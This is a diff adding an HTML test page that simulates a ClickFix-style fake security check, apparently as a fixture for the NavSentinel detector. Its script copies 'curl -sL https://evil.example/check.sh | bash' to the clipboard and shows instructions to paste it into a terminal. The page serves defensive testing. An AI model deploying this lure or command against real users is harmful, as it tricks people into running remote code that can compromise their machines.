@@ -1,0 +1,156 @@
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>ClickFix 02 - Terminal Instructions Variant</title>
+  <style>
+    body {
+      font-family: sans-serif;
+      padding: 24px;
+      background: #1a1a2e;
+      color: #eee;
+    }
+    h1 { margin-top: 0; color: #fff; }
+    .description {
+      background: rgba(255, 243, 205, 0.1);
+      border: 1px solid #ffc107;
+      padding: 12px;
+      border-radius: 4px;
+      margin-bottom: 20px;
+      color: #ffc107;
+    }
+
+    /* Fake security check overlay */
+    #security-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.85);
+      z-index: 10000;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    #security-box {
+      background: #16213e;
+      border: 1px solid #0f3460;
+      border-radius: 12px;
+      padding: 40px;
+      width: 440px;
+      text-align: center;
+    }
+    #security-box .icon {
+      font-size: 48px;
+      margin-bottom: 16px;
+    }
+    #security-box h2 {
+      color: #e94560;
+      margin-top: 0;
+    }
+    #security-box p {
+      color: #a2a2c2;
+      line-height: 1.5;
+    }
+    #security-box .action-btn {
+      display: inline-block;
+      background: #e94560;
+      color: #fff;
+      border: none;
+      padding: 12px 32px;
+      border-radius: 6px;
+      font-size: 16px;
+      cursor: pointer;
+      margin: 16px 0;
+    }
+    #security-box .action-btn:hover {
+      background: #c73854;
+    }
+    .terminal-steps {
+      text-align: left;
+      background: #0a0a1a;
+      border-radius: 8px;
+      padding: 16px;
+      margin-top: 16px;
+      font-family: monospace;
+      font-size: 13px;
+      color: #00ff41;
+      display: none;
+    }
+    .terminal-steps .step {
+      margin: 8px 0;
+      padding-left: 16px;
+    }
+    .terminal-steps .step::before {
+      content: "$ ";
+      color: #666;
+    }
+    .terminal-steps .instruction {
+      color: #a2a2c2;
+      font-family: sans-serif;
+      padding-left: 16px;
+      font-size: 12px;
+    }
+
+    #status {
+      margin-top: 16px;
+      padding: 8px 12px;
+      border-radius: 4px;
+      font-size: 14px;
+      background: rgba(255,255,255,0.1);
+    }
+  </style>
+</head>
+<body>
+  <h1>ClickFix 02 - Terminal Instructions Variant</h1>
+  <div class="description">
+    <strong>Attack scenario:</strong> A fake security check uses dark-themed UI to appear
+    legitimate. After clicking "Run Check", it writes a malicious command to clipboard and
+    shows terminal-style paste instructions.
+    <br><br>
+    <strong>Expected:</strong> NavSentinel detects clipboard write + overlay + paste instructions.
+  </div>
+
+  <div id="security-overlay">
+    <div id="security-box">
+      <div class="icon">&#x1F6E1;</div>
+      <h2>Security Check Required</h2>
+      <p>Your browser requires a quick security verification to access this content.</p>
+
+      <button class="action-btn" id="run-check-btn">Run Security Check</button>
+
+      <div class="terminal-steps" id="terminal-steps">
+        <div class="instruction">Open a terminal and paste the verification code:</div>
+        <div class="step">Open Terminal (Cmd+Space on Mac, or right-click Start > Terminal on Windows)</div>
+        <div class="instruction">Then paste and run:</div>
+        <div class="step">Press Ctrl+V to paste the verification command</div>
+        <div class="step">Press Enter to confirm</div>
+      </div>
+    </div>
+  </div>
+
+  <div id="status">Status: Waiting...</div>
+
+  <script>
+    const runCheckBtn = document.getElementById("run-check-btn");
+    const terminalSteps = document.getElementById("terminal-steps");
+    const statusEl = document.getElementById("status");
+
+    runCheckBtn.addEventListener("click", function() {
+      // Simulated malicious command - uses curl + bash pattern
+      const fakeCommand = "curl -sL https://evil.example/check.sh | bash";
+
+      navigator.clipboard.writeText(fakeCommand).then(function() {
+        terminalSteps.style.display = "block";
+        runCheckBtn.textContent = "Verification Code Copied!";
+        runCheckBtn.style.background = "#2ecc71";
+        statusEl.textContent = "Status: Clipboard write + terminal instructions shown. NavSentinel should detect this.";
+      }).catch(function(err) {
+        statusEl.textContent = "Status: Clipboard write failed: " + err.message;
+      });
+    });
+  </script>
+</body>
+</html>
